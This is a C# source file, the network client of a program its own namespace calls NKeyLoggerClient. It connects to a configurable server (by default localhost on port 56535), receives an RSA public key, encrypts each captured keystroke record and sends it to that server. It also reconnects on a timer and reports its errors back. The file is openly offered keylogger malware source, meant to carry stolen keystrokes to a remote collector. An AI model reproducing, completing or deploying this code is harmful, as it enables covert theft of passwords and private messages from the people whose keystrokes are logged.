using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection.Metadata;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using NKeyLoggerLib;

namespace NKeyLoggerClient;
internal class NetworkClient : ISender, IDisposable
{
    private Network client { get; set; } = new Network();
    public AbstractSetting settings { get; }
    private readonly RSACryptoServiceProvider rsa;
    private readonly System.Timers.Timer reconnectTimer;
    public NetworkClient(AbstractSetting settings)
    {
        this.settings = settings;
        this.settings.onChangeFile += updateSetting;
        fixSettings(this.settings);
        rsa = new RSACryptoServiceProvider();
        reconnectTimer = new System.Timers.Timer( int.Parse(settings.Properties["reconnect"]) );
        connect();
        initTimer();
    }
    ~NetworkClient()
    {
        this.Dispose();
    }

    private void fixSettings(AbstractSetting settings)
    {
        try
        {
            int reconnectTime = int.Parse(settings.Properties["reconnect"]);
            int port = int.Parse(settings.Properties["port"]);
            if (port >= 0xFFFF || port <= 0)
                throw new ApplicationException("Error parse settings: invalid port");
            string address = settings.Properties["address"];
            Log<NetworkClient>.Instance.logger?.LogDebug($"Load settings into network client:\n reconnect time - {reconnectTime}\n" +
                $"port - {port}\n address - {address}\n");
        } catch(Exception) {
            if (settings is Setting s)
            {
                s.insert("address", "localhost");
                s.insert("port", "56535");
                s.insert("reconnect", "5000");
                Log<NetworkClient>.Instance.logger?.LogDebug("Load default settings into network client");
            }
        }
    }

    private void updateSetting(AbstractSetting settings)
    {
        fixSettings(settings);
        connect();
    }
    private void initTimer()
    {
        reconnectTimer.Elapsed += reconnect;
        reconnectTimer.Start();
    }
    private void reconnect(object? sender, System.Timers.ElapsedEventArgs e)
    {
        Log<NetworkClient>.Instance.logger?.LogDebug($"Reconnect network client {e.SignalTime.ToString("D")}");
        if(!client.socket.Connected)
            connect();
    }
    public void connect()
    {
        var reconn = () =>
        {
            Log<NetworkClient>.Instance.logger?.LogDebug($"Network client trying reconnect to {settings.Properties["address"]}");
            disconnect();
            client = new Network();
        };

        if (!client.socket.Connected)
            client = new Network();
        else {
            reconn();
        }

        do
        {
            try
            {
                client.socket.Connect( settings.Properties["address"], int.Parse(settings.Properties["port"]) );
                Log<NetworkClient>.Instance.logger?.LogDebug($"Network client connected to {settings.Properties["address"]}");
                List<byte> dataOpenKey = client.recvAsync().Result.data;
                rsa.ImportRSAPublicKey(dataOpenKey?.ToArray(), out _);
            }
            catch (SocketException){
                reconn();
            } catch(Exception)
            {
                reconn();
            }
        } while (!client.socket.Connected);
    }

    public void disconnect()
    {
        if ( !client.socket.Connected )
            return;
        Log<NetworkClient>.Instance.logger?.LogDebug($"disconnect network client {DateTime.Now.ToString("D")}");
        client.Dispose();
    }

    public void Send(AbstractKeyInfo keyInfo)
    {
        try
        {
            if ( !client.socket.Connected )
                return;

            byte[] encData = rsa.Encrypt(keyInfo.GetBytes(), false);
            client.sendAsync(encData, Network.Type.KEY).Wait();
        }
        catch (Exception ex)
        {
            if(client.socket.Connected)
                client?.sendAsync(Encoding.UTF8.GetBytes(ex.Message), Network.Type.INFO);
        }
    }
    public void Dispose()
    {
        client.Dispose();
        reconnectTimer.Dispose();
    }
}
